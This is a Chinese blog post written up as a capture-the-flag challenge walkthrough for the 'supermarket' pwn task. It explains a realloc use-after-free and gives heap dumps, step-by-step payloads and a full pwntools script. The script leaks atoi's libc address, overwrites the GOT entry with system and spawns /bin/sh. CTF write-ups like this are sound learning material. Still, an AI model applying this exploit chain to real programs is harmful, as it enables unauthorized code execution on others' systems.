@@ -1,0 +1,254 @@
+---
+layout: post
+title: "国赛pwn supermarket"
+date: 2018-05-04
+categories: jekyll update
+---
+### 国赛 supermarket
+
+刚了整个比赛的一道题，走了各种崎岖道路，跳了各种坑，比完赛看wp发现走错了，重要的漏洞点还没发现，在此记录一下做法。
+
+首先要了解一下realloc这个函数：
+```
+realloc原型是extern void *realloc(void *mem_address, unsigned int newsize);
+指针名=（数据类型*）realloc（要改变内存大小的指针名，新的大小）。
+新的大小可大可小（如果新的大小大于原内存大小，则新分配部分不会被初始化；如果新的大小小于原内存大小，可能会导致数据丢失；
+先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。
+```
+
+[realloc与malloc区别的参考](https://www.cnblogs.com/tangshiguang/p/6735402.html)
+
+主要漏洞点：realloc的时候没有把指针重新赋值，也就是description所指的还是原来的地方，但是当realloc申请相对原来大的空间的时候时是会把原来的description的地方free掉，然后就可以把这块空间申请回来，但是编辑之前的description就可以相当于编辑新分配这份内存的内容，可以改下图这个红框的指针的地址为某函数的got表就可以实现info leak了(因为这个结构体中的description是所分配的地址放到结构数组里来指向的)。
+
+<img src="/images/posts/ciscn/1525397434940.png" >
+
+### 进入正题
+
+首先有一个结构体：
+```
+struct node{
+    char name[16];
+    int price;
+    int des_size;
+    char* des;
+}commodity[15];
+```
+
+这个程序有一个add、del、list、Change the price和Change the description of a commodity，其中漏洞点在Change the description那里的realloc函数，realloc的时候没有把指针重新赋值，也就是description所指的还是原来的地方，如果要修复该漏洞的话，可以在让一个指针指向realloc分配的新地址，并重新赋值给原malloc的结构体中的`dest[v5]->description`即可。
+
+<img src="/images/posts/ciscn/1525414188098.png" >
+
+如何利用此漏洞呢？上面已经介绍过了，下面我们一步步来实现。
+
+**第一步（构造堆块）：**
+```
+add("AAAAA", 100, 0x80, "D"*0x80)#创建一个商品
+add("BBBBB", 200, 0x18, "E"*0x18)#创建第二个商品，这可以使后面change第一个商品的description的时候只能free掉原堆块，在后面重新分配一块新的内存来放原来数据的东西
+change_description("AAAAA", 0xb0, "")#change第一个商品比原来的description大的堆块
+add("CCCCC", 200, 0x50, "F"*0x7)#add一个商品去占用第一个商品因为change之后free掉的那个堆块
+```
+add两个商品之后的堆块情况：
+```
+gef➤  x /100xw 0x9cb1000
+0x9cb1000:	0x00000000	0x00000021	0x41414141	0x00000041
+0x9cb1010:	0x00000000	0x00000000	0x00000064	0x00000080
+0x9cb1020:	0x09cb1028	0x00000089	0x44444444	0x44444444
+0x9cb1030:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1040:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1050:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1060:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1070:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1080:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1090:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb10a0:	0x44444444	0x00444444	0x00000000	0x00000021
+0x9cb10b0:	0x42424242	0x00000042	0x00000000	0x00000000
+0x9cb10c0:	0x000000c8	0x00000018	0x09cb10d0	0x00000021
+0x9cb10d0:	0x45454545	0x45454545	0x45454545	0x45454545
+0x9cb10e0:	0x45454545	0x00454545	0x00000000	0x00020f19
+```
+change第一个商品之后的堆块情况：
+```
+gef➤  x /100xw 0x9cb1000
+0x9cb1000:	0x00000000	0x00000021	0x41414141	0x00000041
+0x9cb1010:	0x00000000	0x00000000	0x00000064	0x00000080
+0x9cb1020:	0x09cb1028	0x00000089	0xb76f8700	0xb76f87b0
+0x9cb1030:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1040:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1050:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1060:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1070:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1080:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1090:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb10a0:	0x44444444	0x00444444	0x00000088	0x00000020
+0x9cb10b0:	0x42424242	0x00000042	0x00000000	0x00000000
+0x9cb10c0:	0x000000c8	0x00000018	0x09cb10d0	0x00000021
+0x9cb10d0:	0x45454545	0x45454545	0x45454545	0x45454545
+0x9cb10e0:	0x45454545	0x00454545	0x00000000	0x000000b9
+0x9cb10f0:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1100:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1110:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1120:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1130:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1140:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1150:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1160:	0x44444444	0x44444444	0x44444444	0x00444444
+0x9cb1170:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+add第三个商品之后的堆块情况：
+```
+gef➤  x /100xw 0x9cb1000
+0x9cb1000:	0x00000000	0x00000021	0x41414141	0x00000041
+0x9cb1010:	0x00000000	0x00000000	0x00000064	0x00000080
+0x9cb1020:	0x09cb1028	0x00000021	0x43434343	0xb76f0043
+0x9cb1030:	0x44444444	0x44444444	0x000000c8	0x00000050
+0x9cb1040:	0x09cb1048	0x00000059	0x46464646	0x00464646
+0x9cb1050:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1060:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1070:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1080:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1090:	0x44444444	0x44444444	0x44444444	0x00000011
+0x9cb10a0:	0xb76f87b0	0xb76f87b0	0x00000010	0x00000020
+0x9cb10b0:	0x42424242	0x00000042	0x00000000	0x00000000
+0x9cb10c0:	0x000000c8	0x00000018	0x09cb10d0	0x00000021
+0x9cb10d0:	0x45454545	0x45454545	0x45454545	0x45454545
+0x9cb10e0:	0x45454545	0x00454545	0x00000000	0x000000b9
+0x9cb10f0:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1100:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1110:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1120:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1130:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1140:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1150:	0x44444444	0x44444444	0x44444444	0x44444444
+0x9cb1160:	0x44444444	0x44444444	0x44444444	0x00444444
+0x9cb1170:	0x00000000	0x00000000	0x00000000	0x00000000
+0x9cb1180:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+**第二步（info leak）：**
+```
+payload = "CCCCC\x00" + "G"*(0x1c-6-4-4) + p32(0x50) + p32(atoi)     # + p16(0x00)
+#构造堆块使atoi刚好填上第三个堆块中的结构体中最后一个参数的指针description的位置，让list的时候去找description的时候变成跳到atoi的got表的位置去打印atoi函数的真实地址从而达到info leak的目的
+change_description("AAAAA", 0x80, payload)
+list()
+p.recvuntil("CCCCC: price.")
+p.recv(16)
+real_atoi = u32(p.recv(4))
+system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])
+```
+执行第二步之后的堆块情况：
+```
+gef➤  x /100xw 0x89b5000
+0x89b5000:	0x00000000	0x00000021	0x41414141	0x00000041
+0x89b5010:	0x00000000	0x00000000	0x00000064	0x00000080
+0x89b5020:	0x089b5028	0x00000021	0x43434343	0x47470043
+0x89b5030:	0x47474747	0x47474747	0x47474747	0x00000050
+0x89b5040:	0x0804b048	0x00000000	0x46464646	0x00464646
+0x89b5050:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5060:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5070:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5080:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5090:	0x44444444	0x44444444	0x44444444	0x00000011
+0x89b50a0:	0xb77a07b0	0xb77a07b0	0x00000010	0x00000020
+0x89b50b0:	0x42424242	0x00000042	0x00000000	0x00000000
+0x89b50c0:	0x000000c8	0x00000018	0x089b50d0	0x00000021
+0x89b50d0:	0x45454545	0x45454545	0x45454545	0x45454545
+0x89b50e0:	0x45454545	0x00454545	0x00000000	0x000000b9
+0x89b50f0:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5100:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5110:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5120:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5130:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5140:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5150:	0x44444444	0x44444444	0x44444444	0x44444444
+0x89b5160:	0x44444444	0x44444444	0x44444444	0x00444444
+0x89b5170:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+**第三步（根据泄露出来的地址找到对应的libc库）**
++ 法一：libc-database
++ 法二：直接网上查找libc库：[网页版的libc-database](https://libc.blukat.me/?q=atoi%3A050&l=libc6-i386_2.23-0ubuntu10_amd64)
+
+**第四步（getshell）：**
+```
+change_description("CCCCC", 0x50, p32(system))#把description填为system的函数地址，因为前面已经把description的指针改为atoi函数的got表了，所以这个操作实际上是修改atoi函数的got表，因此下次调用atoi函数的时候会跳到system函数去执行，最后再传system的参数/bin/sh\x00即可
+pause()
+p.recvuntil("your choice>> ")
+p.sendline("/bin/sh\x00")
+```
+
+最后完整脚本：
+```
+#!/usr/bin/env python2
+# -*- coding:utf-8 -*-
+from pwn import *
+import sys
+
+p = process('./supermarket')
+#p = remote('117.78.27.192',31438)
+elf = ELF("./supermarket")
+libc = ELF("./libc.so.6")
+#libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
+
+def add(name,price,size,description):
+    global p
+    p.recvuntil('>>')
+    p.sendline('1')
+    p.recvuntil('name:')
+    p.sendline(str(name))
+    p.recvuntil('price:')
+    p.sendline(str(price))
+    p.recvuntil('descrip_size:')
+    p.sendline(str(size))
+    p.recvuntil('description:')
+    p.sendline(str(description))
+
+
+def delete(name):
+    global p
+    p.recvuntil('>>')
+    p.sendline('2')
+    p.recvuntil('name:')
+    p.sendline(str(name))
+
+def list():
+    global p
+    p.recvuntil('>>')
+    p.sendline('3')
+
+def change_description(name, size,description):
+    global p
+    p.recvuntil('>>')
+    p.sendline('5')
+    p.recvuntil('name:')
+    p.sendline(str(name))
+    p.recvuntil('descrip_size:')
+    p.sendline(str(size))
+    p.recvuntil('description:')
+    p.sendline(str(description))
+
+free_got = elf.got['free']
+atoi = elf.got['atoi']
+puts = elf.plt['puts']
+
+add("AAAAA", 100, 0x80, "D"*0x80)
+add("BBBBB", 200, 0x18, "E"*0x18)
+#pause()
+change_description("AAAAA", 0xb0, "")
+add("CCCCC", 200, 0x50, "F"*0x7)
+#pause()
+payload = "CCCCC\x00" + "G"*(0x1c-6-4-4) + p32(0x50) + p32(atoi)     # + p16(0x00)
+change_description("AAAAA", 0x80, payload)
+list()
+p.recvuntil("CCCCC: price.")
+p.recv(16)
+real_atoi = u32(p.recv(4))
+system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])
+
+log.info("real_atoi: %s" % hex(real_atoi))
+log.info("system: %s" % hex(system))
+change_description("CCCCC", 0x50, p32(system))
+#pause()
+p.recvuntil("your choice>> ")
+p.sendline("/bin/sh\x00")
+p.interactive()
+```
